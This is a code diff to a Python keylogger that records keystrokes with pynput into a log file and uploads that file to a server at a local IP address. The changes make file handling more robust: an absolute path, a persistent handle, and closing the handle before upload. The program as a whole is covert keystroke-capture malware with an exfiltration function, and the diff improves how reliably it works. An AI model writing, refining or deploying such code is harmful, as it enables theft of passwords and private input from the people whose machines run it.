@@ -4,16 +4,27 @@ import os
 import requests
 from pynput import keyboard
 
-LOG_FILE = "log.txt"
+LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")
 UPLOAD_URL = "http://192.168.122.1:5000/upload"
 
 logging.basicConfig(level=logging.INFO)
 
+_log_file_handle = None
+
+def _get_log_handle():
+    global _log_file_handle
+    if _log_file_handle is None or _log_file_handle.closed:
+        _log_file_handle = open(LOG_FILE, "a", encoding="utf-8")
+    return _log_file_handle
+
 def write_log(text):
-    """Helper to safely write to the log file."""
-    with open(LOG_FILE, "a", encoding="utf-8") as log:
-        log.write(text)
-        log.flush()
+    """Helper to write to the log file, keeping the handle open."""
+    try:
+        handle = _get_log_handle()
+        handle.write(text)
+        handle.flush()
+    except OSError as e:
+        print(f"Log write failed: {e}")
 
 def on_press(key):
     try:
@@ -37,6 +48,14 @@ def on_release(key):
 
 def upload_log():
     """Sends the log file to the server."""
+    global _log_file_handle
+    if _log_file_handle is not None and not _log_file_handle.closed:
+        try:
+            _log_file_handle.close()
+        except OSError:
+            pass
+        _log_file_handle = None
+
     if not os.path.exists(LOG_FILE) or not UPLOAD_URL:
         return
     try:
